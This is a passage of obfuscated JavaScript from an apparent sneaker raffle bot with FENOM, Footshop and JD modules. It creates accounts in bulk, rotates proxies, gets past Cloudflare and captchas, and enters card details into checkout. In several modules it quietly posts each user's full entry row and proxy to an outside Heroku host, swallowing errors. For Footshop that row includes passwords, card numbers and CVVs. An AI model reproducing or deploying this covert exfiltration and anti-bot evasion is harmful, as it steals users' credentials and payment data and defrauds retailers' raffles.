                                        throw new Error('Empty\x20Turnstile\x20Challenge');
                                    }
                                try {
                                    await _0x375c43['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                } catch {
                                    var _0x2744fa = await _0x375c43['$']('.hcaptcha-box');
                                    if (_0x2744fa)
                                        try {
                                            await _0x2744fa['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                }
                            }
                            try {
                                await _0x375c43['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x1d4c0 }), await _0x15a033['send']('Browser.setWindowBounds', {
                                    'windowId': _0x5f08aa,
                                    'bounds': { 'windowState': 'minimized' }
                                }), await _0x4d70b1(0xfa0);
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            console['log'](_0x446ef5() + '\x20[' + _0x3af98a['name'] + ']\x20Task\x20' + (_0x5dd67a + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x375c43['type']('input[name=\x22firstname\x22]', '' + _0x5d1e5f[_0x5dd67a]['FirstName']), await _0x4d70b1(0x1f4), await _0x375c43['type']('input[name=\x22lastname\x22]', '' + _0x5d1e5f[_0x5dd67a]['LastName']), await _0x4d70b1(0x1f4), await _0x375c43['type']('input[name=\x22email\x22]', '' + _0x5d1e5f[_0x5dd67a]['Email']), await _0x4d70b1(0x1f4), await _0x375c43['type']('input[name=\x22password\x22]', '' + _0x5d1e5f[_0x5dd67a]['Password']), await _0x4d70b1(0x258), await _0x375c43['$eval']('input[name=\x22psgdpr\x22]', _0x407038 => _0x407038['click']()), await _0x4d70b1(0x1f4), console['log'](_0x446ef5() + '\x20[' + _0x3af98a['name'] + ']\x20Task\x20' + (_0x5dd67a + 0x1) + '\x20:\x20Sending\x20Request'), await _0x375c43['$eval']('#customer-form', _0x231632 => _0x231632['submit']());
                            try {
                                try {
                                    await _0x375c43['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 });
                                } catch {
                                    throw new Error('Succes-response\x20not\x20found');
                                }
                                _0x3cc727 = 'no', console['log'](_0x46bace['green'](_0x446ef5() + '\x20[' + _0x3af98a['name'] + ']\x20Task\x20' + (_0x5dd67a + 0x1) + '\x20:\x20Account\x20' + _0x5d1e5f[_0x5dd67a]['Email'] + '\x20Generated')), _0xf25b74['appendFileSync']('../accounts/fenom.csv', '\x0a' + _0x5d1e5f[_0x5dd67a]['Email'] + ',' + _0x5d1e5f[_0x5dd67a]['Password']);
                                let _0x2bf586 = _0x5d1e5f[_0x5dd67a];
                                try {
                                    prxdata = {
                                        'username': _0x5e8391['replace']('#', ''),
                                        'module': _0x3af98a['name'],
                                        'entrydata': JSON['stringify'](_0x2bf586),
                                        'proxy': '' + _0x270c41[_0x5dd67a]
                                    };
                                    var _0x34ea0e = JSON['stringify'](prxdata);
                                    let _0x121f93 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x582cfc['post']('https://jraffles.herokuapp.com/success', _0x34ea0e, _0x121f93);
                                } catch (_0x2defc8) {
                                }
                                try {
                                    _0x35ea91['webhook'] != undefined && _0x35ea91['webhook'] != '' && await _0x19fe15(_0x35ea91['webhook'], _0x5a53cd['succesDEVMSG']);
                                } catch {
                                }
                                await _0x19fe15(_0x55ae18, _0x5a53cd['succesDEVMSG']);
                            } catch (_0x19e017) {
                                throw new Error('Account\x20generation\x20failed');
                            }
                        } catch (_0x1c23c1) {
                            console['log'](_0x46bace['red'](_0x446ef5() + '\x20[' + _0x3af98a['name'] + ']\x20Task\x20' + (_0x5dd67a + 0x1) + '\x20:\x20' + _0x1c23c1)), _0x37a3f1 = '' + _0x1c23c1;
                            var _0x418e2b = await _0x39e876(_0x5d1e5f[_0x5dd67a], _0x3af98a, 'acc', !![], _0x37a3f1);
                            _0x5a53cd['errorDEV'] = { 'embeds': [_0x418e2b] }, _0x35ea91['webhook'] != undefined && _0x35ea91['webhook'] != '' && await _0x19fe15(_0x35ea91['webhook'], _0x5a53cd['errorDEV']), await _0x19fe15(_0x556085, _0x5a53cd['errorDEV']), _0x3cc727 = 'yes';
                        } finally {
                            _0x24b384['close']();
                            if (_0x3cc727 == 'yes' && _0x1b1964 != 0x5 && _0x37a3f1 != 'Size\x20Not\x20Found') {
                                console['log'](_0x46bace['red'](_0x446ef5() + '\x20[' + _0x3af98a['name'] + ']\x20Task\x20' + (_0x5dd67a + 0x1) + '\x20:\x20Retrying\x20(' + _0x1b1964 + '\x20/\x205)')), _0x5dd67a = _0x5dd67a - 0x1, _0x1b1964 = _0x1b1964 + 0x1;
                                continue;
                            }
                            _0x3cc727 == 'yes' && _0x1b1964 >= 0x5 && (_0x5415a4(_0x5d1e5f[_0x5dd67a], _0x3af98a), _0x3cc727 = 'no', _0x1b1964 = 0x0), console['log'](_0x446ef5() + '\x20[' + _0x3af98a['name'] + ']\x20Waiting\x20for\x20' + _0x35ea91['delay'] + '\x20ms'), await _0x4d70b1(_0x35ea91['delay']);
                        }
                    }
                }
            },
            {
                'name': 'FENOM\x20Raffle\x20Entries',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function _0x3a6c23(_0x4bc7ff, _0x8909ec, _0x1d3c7f) {
                    _0x4ada75['use'](_0x120ab9()), _0x4ada75['use'](_0x2d400b({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x35ea91['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x3e9e74 = 0x0; _0x3e9e74 < _0x8909ec['length']; _0x3e9e74++) {
                        if (_0x2f38fc != 'yes')
                            var _0x2f38fc = '', _0xc16ff3 = 0x0;
                        var _0x406940;
                        try {
                            await _0x408b94(_0x8909ec, _0x3e9e74);
                        } catch {
                            _0x2f38fc = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x1e0e73(_0x4bc7ff['name'] + '\x20Task\x20' + (_0x3e9e74 + 0x1) + '\x20/\x20' + _0x8909ec['length'] + '\x20||\x20File:\x20' + _0x18b452 + '\x20Proxies:\x20' + _0x324cb1);
                        const _0x28980c = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0xe804ce = Math['round'](Math['random']() * (_0x1d3c7f['length'] - 0x1)), _0x1d9a32 = _0x1d3c7f[_0xe804ce]['split'](':'), _0x7f99cf;
                        try {
                            _0x7f99cf = await _0x4ada75['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x1d9a32[0x0] + ':' + _0x1d9a32[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x7f99cf = await _0x4ada75['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x1d9a32[0x0] + ':' + _0x1d9a32[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x29933b = await _0x7f99cf['newPage'](), _0x142159 = await _0x29933b['target']()['createCDPSession'](), { windowId: _0x493b48 } = await _0x142159['send']('Browser.getWindowForTarget');
                            await _0x29933b['authenticate']({
                                'username': '' + _0x1d9a32[0x2],
                                'password': '' + _0x1d9a32[0x3]
                            }), console['log'](_0x446ef5() + '\x20[' + _0x4bc7ff['name'] + ']\x20Task\x20' + (_0x3e9e74 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x29933b['goto']('https://www.fenom.com/en/authentication', { 'waitUntil': 'networkidle2' }), console['log'](_0x446ef5() + '\x20[' + _0x4bc7ff['name'] + ']\x20Task\x20' + (_0x3e9e74 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x4d70b1(0xbb8), await _0x142159['send']('Browser.setWindowBounds', {
                                'windowId': _0x493b48,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x4d70b1(0x1f40);
                            try {
                                await _0x29933b['waitForSelector']('input[name=\x22email\x22]', { 'timeout': 0x1d4c0 });
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            await _0x4d70b1(0x1388), console['log'](_0x446ef5() + '\x20[' + _0x4bc7ff['name'] + ']\x20Task\x20' + (_0x3e9e74 + 0x1) + '\x20:\x20Logging\x20in'), await _0x29933b['type']('input[name=\x22email\x22]', '' + _0x8909ec[_0x3e9e74]['Email']), await _0x4d70b1(0x1f4), await _0x29933b['type']('input[name=\x22password\x22]', '' + _0x8909ec[_0x3e9e74]['Password']), await _0x4d70b1(0x258), await _0x29933b['$eval']('#login-form', _0x2abba5 => _0x2abba5['submit']()), await _0x29933b['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), await _0x4d70b1(0x1f4), await _0x29933b['goto']('' + _0x8909ec[_0x3e9e74]['Url']), await _0x29933b['waitForSelector']('.prod-variant\x20>\x20ul\x20>\x20li'), console['log'](_0x446ef5() + '\x20[' + _0x4bc7ff['name'] + ']\x20Task\x20' + (_0x3e9e74 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x8909ec[_0x3e9e74]['Size']);
                            if (_0x8909ec[_0x3e9e74]['Size'] != 'RANDOM') {
                                var _0x47b13f = '\x20' + _0x8909ec[_0x3e9e74]['Size'] + '\x20';
                                const _0x2d27a9 = await _0x29933b['$x']('//span[contains(text(),\x20' + _0x47b13f + ')]');
                                await _0x2d27a9[0x0]['click']();
                            } else {
                                const _0x173813 = await _0x29933b['$$']('.prod-variant\x20>\x20ul\x20>\x20li');
                                var _0x5a7bad = Math['round'](Math['random']() * (_0x173813['length'] - 0x1));
                                await _0x173813[_0x5a7bad]['click']();
                            }
                            await _0x4d70b1(0x258), await _0x29933b['click']('#cookieChoiceDismiss'), await _0x4d70b1(0x3e8), await _0x29933b['type']('#instagram-account', '' + _0x8909ec[_0x3e9e74]['Follower']), await _0x4d70b1(0x28a), await _0x29933b['click']('#book-btn'), await _0x4d70b1(0xbb8);
                            try {
                                await _0x29933b['waitForSelector']('#recaptcha-container\x20>\x20div\x20>\x20div\x20>\x20iframe');
                            } catch {
                                throw new Error('Captcha\x20not\x20found');
                            }
                            await _0x4d70b1(0x1f4), console['log'](_0x446ef5() + '\x20[' + _0x4bc7ff['name'] + ']\x20Task\x20' + (_0x3e9e74 + 0x1) + '\x20:\x20' + _0x46bace['cyan']('Solving\x20Captcha')), await _0x29933b['solveRecaptchas'](), console['log'](_0x446ef5() + '\x20[' + _0x4bc7ff['name'] + ']\x20Task\x20' + (_0x3e9e74 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x4d70b1(0x7d0), await _0x29933b['$eval']('#book-btn-for-sure', _0x55cae9 => _0x55cae9['click']()), await _0x4d70b1(0x12c), await _0x29933b['click']('#book-btn-for-sure'), await _0x4d70b1(0xdac);
                            const _0x1f2a0c = await _0x29933b['$eval']('.reservation-popup\x20>\x20.title', _0x5cc7c2 => {
                                return _0x5cc7c2['innerHTML'];
                            });
                            if (_0x1f2a0c) {
                                _0x2f38fc = 'no', _0x5155d2(_0x8909ec[_0x3e9e74], _0x4bc7ff), console['log'](_0x46bace['green'](_0x446ef5() + '\x20[' + _0x4bc7ff['name'] + ']\x20Task\x20' + (_0x3e9e74 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0x2788df = await _0x39e876(_0x8909ec[_0x3e9e74], _0x4bc7ff, 'dev', ![]), _0x4c9137 = await _0x39e876(_0x8909ec[_0x3e9e74], _0x4bc7ff, 'pub', ![]);
                                let _0x36940b = _0x8909ec[_0x3e9e74];
                                try {
                                    prxdata = {
                                        'username': _0x5e8391['replace']('#', ''),
                                        'module': _0x4bc7ff['name'],
                                        'entrydata': JSON['stringify'](_0x36940b),
                                        'proxy': '' + _0x1d3c7f[_0x3e9e74]
                                    };
                                    var _0x488ef4 = JSON['stringify'](prxdata);
                                    let _0x32918a = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x582cfc['post']('https://jraffles.herokuapp.com/success', _0x488ef4, _0x32918a);
                                } catch (_0xa7bdb6) {
                                }
                                const _0x291d7c = {
                                    'succesDEVMSG': { 'embeds': [_0x2788df] },
                                    'succesPUBMSG': { 'embeds': [_0x4c9137] }
                                };
                                try {
                                    _0x35ea91['webhook'] != undefined && _0x35ea91['webhook'] != '' && await _0x19fe15(_0x35ea91['webhook'], _0x291d7c['succesDEVMSG']), await _0x4d70b1(0xc8), await _0x19fe15(_0x53da78, _0x291d7c['succesDEVMSG']), await _0x4d70b1(0xc8), await _0x19fe15(_0x44bee6, _0x291d7c['succesPUBMSG']);
                                } catch (_0x3ca76d) {
                                    console['log'](_0x46bace['yellow'](_0x446ef5() + '\x20[' + _0x4bc7ff['name'] + ']\x20Task\x20' + (_0x3e9e74 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x3ca76d));
                                }
                            } else
                                throw new Error('Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.');
                        } catch (_0x5e641a) {
                            console['log'](_0x46bace['red'](_0x446ef5() + '\x20[' + _0x4bc7ff['name'] + ']\x20Task\x20' + (_0x3e9e74 + 0x1) + '\x20:\x20' + _0x5e641a)), _0x406940 = '' + _0x5e641a;
                            var _0x2f799d = await _0x39e876(_0x8909ec[_0x3e9e74], _0x4bc7ff, 'dev', !![], _0x406940), _0x2788df = await _0x39e876(_0x8909ec[_0x3e9e74], _0x4bc7ff, 'dev', ![]), _0x4c9137 = await _0x39e876(_0x8909ec[_0x3e9e74], _0x4bc7ff, 'pub', ![]);
                            const _0x4a36ef = {
                                'succesDEVMSG': { 'embeds': [_0x2788df] },
                                'succesPUBMSG': { 'embeds': [_0x4c9137] }
                            };
                            _0x4a36ef['errorDEV'] = { 'embeds': [_0x2f799d] }, _0x35ea91['webhook'] != undefined && _0x35ea91['webhook'] != '' && await _0x19fe15(_0x35ea91['webhook'], _0x4a36ef['errorDEV']), await _0x19fe15(_0x556085, _0x4a36ef['errorDEV']), _0x5e641a != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x2f38fc = 'yes');
                        } finally {
                            _0x7f99cf['close']();
                            if (_0x2f38fc == 'yes' && _0xc16ff3 != 0x5 && _0x406940 != 'Size\x20Not\x20Found') {
                                console['log'](_0x46bace['red'](_0x446ef5() + '\x20[' + _0x4bc7ff['name'] + ']\x20Task\x20' + (_0x3e9e74 + 0x1) + '\x20:\x20Retrying\x20(' + _0xc16ff3 + '\x20/\x205)')), _0x3e9e74 = _0x3e9e74 - 0x1, _0xc16ff3 = _0xc16ff3 + 0x1;
                                continue;
                            }
                            _0x2f38fc == 'yes' && _0xc16ff3 >= 0x5 && (_0x5415a4(_0x8909ec[_0x3e9e74], _0x4bc7ff), _0x2f38fc = 'no', _0xc16ff3 = 0x0), console['log'](_0x446ef5() + '\x20[' + _0x4bc7ff['name'] + ']\x20Waiting\x20for\x20' + _0x35ea91['delay'] + '\x20ms'), await _0x4d70b1(_0x35ea91['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png',
            'function': async function (_0x14ffff, _0x26aa45, _0x7966fc) {
                _0x4ada75['use'](_0x120ab9()), _0x4ada75['use'](_0x2d400b({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x35ea91['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x4e25e2 = 0x0; _0x4e25e2 < _0x26aa45['length']; _0x4e25e2++) {
                    var _0x4fe446;
                    if (_0x5e083c != 'yes')
                        var _0x5e083c = '', _0x84e900 = 0x0;
                    var _0x1313aa = [{
                        'type': 'rich',
                        'title': 'Succesful\x20Footshop\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'User',
                                'value': '' + _0x5e8391
                            },
                            {
                                'name': 'Product',
                                'value': '' + _0x26aa45[_0x4e25e2]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x26aa45[_0x4e25e2]['Size']
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x35ea91['footshopDelay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x4d5366
                            }
                        ]
                    }], _0x5a8ee5 = await _0x39e876(_0x26aa45[_0x4e25e2], _0x14ffff, 'dev', ![]), _0x302c30 = await _0x39e876(_0x26aa45[_0x4e25e2], _0x14ffff, 'pub', ![]);
                    const _0x3c3d77 = {
                        'succesDEVMSG': { 'embeds': [_0x5a8ee5] },
                        'succesPUBMSG': { 'embeds': [_0x302c30] }
                    }, _0x2e1439 = { 'embeds': _0x1313aa };
                    try {
                        await _0x408b94(_0x26aa45, _0x4e25e2);
                    } catch {
                        _0x5e083c = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    if (_0x26aa45[_0x4e25e2]['Email'] == '' || _0x26aa45[_0x4e25e2]['FirstName'] == '' || _0x26aa45[_0x4e25e2]['LastName'] == '' || _0x26aa45[_0x4e25e2]['Country'] == '' || _0x26aa45[_0x4e25e2]['Size'] == '' || _0x26aa45[_0x4e25e2]['Address1'] == '' || _0x26aa45[_0x4e25e2]['Zip'] == '') {
                        console['log'](_0x446ef5() + '\x20[' + _0x14ffff['name'] + ']\x20Task\x20' + (_0x4e25e2 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x26aa45[_0x4e25e2]['Email'] == '' || _0x26aa45[_0x4e25e2]['FirstName'] == '' || _0x26aa45[_0x4e25e2]['LastName'] == '' || _0x26aa45[_0x4e25e2]['Country'] == '' || _0x26aa45[_0x4e25e2]['Size'] == '' || _0x26aa45[_0x4e25e2]['Address1'] == '' || _0x26aa45[_0x4e25e2]['Zip'] == '' || _0x26aa45[_0x4e25e2]['Phone'] == '') {
                        console['log'](_0x446ef5() + '\x20[' + _0x14ffff['name'] + ']\x20Task\x20' + (_0x4e25e2 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    const _0x4e7b47 = '' + _0x26aa45[_0x4e25e2]['Url'];
                    if (_0x35ea91['useRandomProxy'] = ![])
                        var _0x350e31 = _0x7966fc[_0x4e25e2]['split'](':');
                    else
                        var _0xf3f476 = Math['round'](Math['random']() * (_0x7966fc['length'] - 0x1)), _0x350e31 = _0x7966fc[_0xf3f476]['split'](':');
                    var _0x48f0d0;
                    try {
                        _0x48f0d0 = await _0x4ada75['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x350e31[0x0] + ':' + _0x350e31[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x48f0d0 = await _0x4ada75['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x350e31[0x0] + ':' + _0x350e31[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x490335 = await _0x48f0d0['newPage']();
                        await _0x490335['authenticate']({
                            'username': '' + _0x350e31[0x2],
                            'password': '' + _0x350e31[0x3]
                        }), console['log'](_0x446ef5() + '\x20[' + _0x14ffff['name'] + ']\x20Task\x20' + (_0x4e25e2 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x490335['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x490335['setRequestInterception'](!![]), _0x490335['on']('request', _0x1587ff => {
                            _0x1587ff['resourceType']() === 'image' || _0x1587ff['resourceType']() === 'font' || _0x1587ff['resourceType']() === 'media' ? _0x1587ff['abort']() : _0x1587ff['continue']();
                        });
                        try {
                            await _0x490335['goto'](_0x4e7b47), await _0x4d70b1(0xbb8), await _0x490335['waitForSelector']('.control__JhutY');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x490335['click']('.control__JhutY'), await _0x4d70b1(0x1f4);
                        if (_0x26aa45[_0x4e25e2]['Size'] != 'RANDOM')
                            try {
                                const _0x2f98b9 = await _0x490335['$x']('//div[contains(text(),\x20\x27' + _0x26aa45[_0x4e25e2]['Size'] + '\x27)]');
                                await _0x2f98b9[0x0]['click']();
                            } catch {
                                console['log'](_0x46bace['red'](_0x446ef5() + '\x20[' + _0x14ffff['name'] + ']\x20Task\x20' + (_0x4e25e2 + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                                continue;
                            }
                        else {
                            const _0x540026 = await _0x490335['$$']('.options__3UQpT\x20>\x20div.row');
                            var _0x28faf2 = Math['round'](Math['random']() * (_0x540026['length'] - 0x1));
                            await _0x540026[_0x28faf2]['click']();
                        }
                        await _0x4d70b1(0x4b0);
                        const _0xe84bc2 = await _0x490335['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
                        await _0xe84bc2[0x0]['click'](), await _0x490335['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0x446ef5() + '\x20[' + _0x14ffff['name'] + ']\x20Task\x20' + (_0x4e25e2 + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0x490335['type']('input[name=\x22email\x22]', '' + _0x26aa45[_0x4e25e2]['Email']), await _0x4d70b1(0x640), await _0x490335['type']('input[name=\x22phone\x22]', '' + _0x26aa45[_0x4e25e2]['Phone']), await _0x4d70b1(0x4b0), await _0x490335['click']('button.btn.continue-button__1RtsS'), await _0x4d70b1(0x4b0);
                        try {
                            await _0x490335['type']('input[name=\x22firstName\x22]', '' + _0x26aa45[_0x4e25e2]['FirstName']), await _0x4d70b1(0x258);
                        } catch {
                            const _0x5074cb = await _0x490335['$$eval']('.invalid-feedback\x20>\x20div', _0x12e9de => {
                                return _0x12e9de['map'](_0x2b295d => _0x2b295d['innerText']);
                            });
                            console['log'](_0x46bace['red'](_0x446ef5() + '\x20[' + _0x14ffff['name'] + ']\x20Task\x20' + (_0x4e25e2 + 0x1) + '\x20:\x20' + _0x5074cb));
                            continue;
                        }
                        await _0x490335['type']('input[name=\x22lastName\x22]', '' + _0x26aa45[_0x4e25e2]['LastName']), await _0x4d70b1(0xc8), await _0x490335['type']('input[name=\x22instagramUsername\x22]', '' + _0x26aa45[_0x4e25e2]['Follower']), await _0x4d70b1(0x4b0), await _0x490335['click']('button.btn.continue-button__1RtsS'), await _0x4d70b1(0x3e8), console['log'](_0x446ef5() + '\x20[' + _0x14ffff['name'] + ']\x20Task\x20' + (_0x4e25e2 + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0x490335['select']('select[name=\x22country\x22]', '' + _0x26aa45[_0x4e25e2]['Country']), await _0x4d70b1(0x2bc), await _0x490335['type']('input[name=\x22streetName\x22]', '' + _0x26aa45[_0x4e25e2]['Address1']), await _0x4d70b1(0x258), await _0x490335['type']('input[name=\x22houseNumber\x22]', _0x26aa45[_0x4e25e2]['HouseNumber'] + '\x20' + _0x26aa45[_0x4e25e2]['Address2']), await _0x4d70b1(0xc8), await _0x490335['type']('input[name=\x22postalCode\x22]', '' + _0x26aa45[_0x4e25e2]['Zip']), await _0x4d70b1(0x1f4), await _0x490335['type']('input[name=\x22city\x22]', '' + _0x26aa45[_0x4e25e2]['City']), await _0x4d70b1(0x4b0), await _0x490335['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0x4d70b1(0x4b0), await _0x490335['click']('button.btn.continue-button__1RtsS'), await _0x4d70b1(0x4b0), console['log'](_0x446ef5() + '\x20[' + _0x14ffff['name'] + ']\x20Task\x20' + (_0x4e25e2 + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0x490335['solveRecaptchas'](), console['log'](_0x446ef5() + '\x20[' + _0x14ffff['name'] + ']\x20Task\x20' + (_0x4e25e2 + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0x4d70b1(0xbb8), await _0x490335['click']('button.btn.continue-button__1RtsS'), await _0x4d70b1(0x1388), console['log'](_0x446ef5() + '\x20[' + _0x14ffff['name'] + ']\x20Task\x20' + (_0x4e25e2 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x490335['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x490335['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x4d70b1(0x4b0), await _0x490335['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0x26aa45[_0x4e25e2]['CardNumber']), await _0x4d70b1(0x320), await _0x490335['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x490335['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0x26aa45[_0x4e25e2]['ExpiryDate']), await _0x4d70b1(0x4b0), await _0x490335['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x490335['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0x26aa45[_0x4e25e2]['CVV']), await _0x4d70b1(0x226), await _0x490335['type']('input[name=\x22holderName\x22]', '' + _0x26aa45[_0x4e25e2]['NameOnCard']), await _0x4d70b1(0x226), await _0x490335['click']('button.adyen-checkout__button'), console['log'](_0x446ef5() + '\x20[' + _0x14ffff['name'] + ']\x20Task\x20' + (_0x4e25e2 + 0x1) + '\x20:\x20Awaiting\x203DS');
                        try {
                            await _0x490335['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0x4d70b1(0xbb8);
                        } catch (_0x4949ad) {
                            console['log'](_0x46bace['red'](_0x446ef5() + '\x20[' + _0x14ffff['name'] + ']\x20Task\x20' + (_0x4e25e2 + 0x1) + '\x20:\x203DS\x20Failed')), _0x4fe446 = '3DS\x20Error\x20' + _0x4949ad;
                            var _0x5edcb8 = await _0x39e876(_0x26aa45[_0x4e25e2], _0x14ffff, 'dev', !![], _0x4fe446);
                            _0x3c3d77['errorDEV'] = { 'embeds': [_0x5edcb8] };
                            _0x35ea91['webhook'] != undefined && _0x35ea91['webhook'] != '' && await _0x19fe15(_0x35ea91['webhook'], _0x3c3d77['errorDEV']);
                            await _0x19fe15(_0x556085, _0x3c3d77['errorDEV']);
                            continue;
                        }
                        _0x5155d2(_0x26aa45[_0x4e25e2], _0x14ffff), console['log'](_0x46bace['green'](_0x446ef5() + '\x20[' + _0x14ffff['name'] + ']\x20Task\x20' + (_0x4e25e2 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        let _0x48b531 = _0x26aa45[_0x4e25e2];
                        try {
                            prxdata = {
                                'username': _0x5e8391['replace']('#', ''),
                                'module': _0x14ffff['name'],
                                'entrydata': JSON['stringify'](_0x48b531),
                                'proxy': '' + _0x7966fc[_0x4e25e2]
                            };
                            var _0x503fb2 = JSON['stringify'](prxdata);
                            let _0x1ff71d = { 'headers': { 'content-type': 'application/json' } };
                            await _0x582cfc['post']('https://jraffles.herokuapp.com/success', _0x503fb2, _0x1ff71d);
                        } catch (_0x232721) {
                        }
                        if (_0x35ea91['webhook'] != undefined && _0x35ea91['webhook'] != '')
                            try {
                                await _0x19fe15(_0x35ea91['webhook'], _0x3c3d77['succesDEVMSG']);
                            } catch {
                            }
                        await _0x4d70b1(0xc8), await _0x19fe15(_0x53da78, _0x3c3d77['succesDEVMSG']), await _0x4d70b1(0xc8);
                        try {
                            await _0x19fe15(_0x44bee6, _0x3c3d77['succesPUBMSG']);
                        } catch {
                        }
                    } catch (_0x5159e9) {
                        console['log'](_0x446ef5() + '\x20[' + _0x14ffff['name'] + ']\x20Task\x20' + (_0x4e25e2 + 0x1) + '\x20:\x20' + _0x5159e9), _0x4fe446 = '' + _0x5159e9;
                        var _0x5edcb8 = await _0x39e876(_0x26aa45[_0x4e25e2], _0x14ffff, 'dev', !![], _0x4fe446);
                        _0x3c3d77['errorDEV'] = { 'embeds': [_0x5edcb8] }, _0x35ea91['webhook'] != undefined && _0x35ea91['webhook'] != '' && await _0x19fe15(_0x35ea91['webhook'], _0x3c3d77['errorDEV']), await _0x19fe15(_0x556085, _0x3c3d77['errorDEV']), _0x5e083c = 'yes';
                    } finally {
                        _0x48f0d0['close']();
                        if (_0x5e083c == 'yes' && _0x84e900 != 0x5) {
                            console['log'](_0x46bace['red'](_0x446ef5() + '\x20[' + _0x14ffff['name'] + ']\x20Task\x20' + (_0x4e25e2 + 0x1) + '\x20:\x20Retrying\x20(' + _0x84e900 + '\x20/\x205)')), _0x4e25e2 = _0x4e25e2 - 0x1, _0x84e900 = _0x84e900 + 0x1;
                            continue;
                        }
                        console['log']('Waiting\x20for\x20' + _0x35ea91['delay'] + '\x20ms'), await _0x4d70b1(_0x35ea91['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png',
            'function': async function (_0x46d7f1, _0x1f8e84, _0x41f1a4) {
                var _0x4bcf11 = ![], _0x1ed042 = ![];
                if (_0x35ea91['captchaKey'] == '' || _0x35ea91['captchaKey'] == undefined)
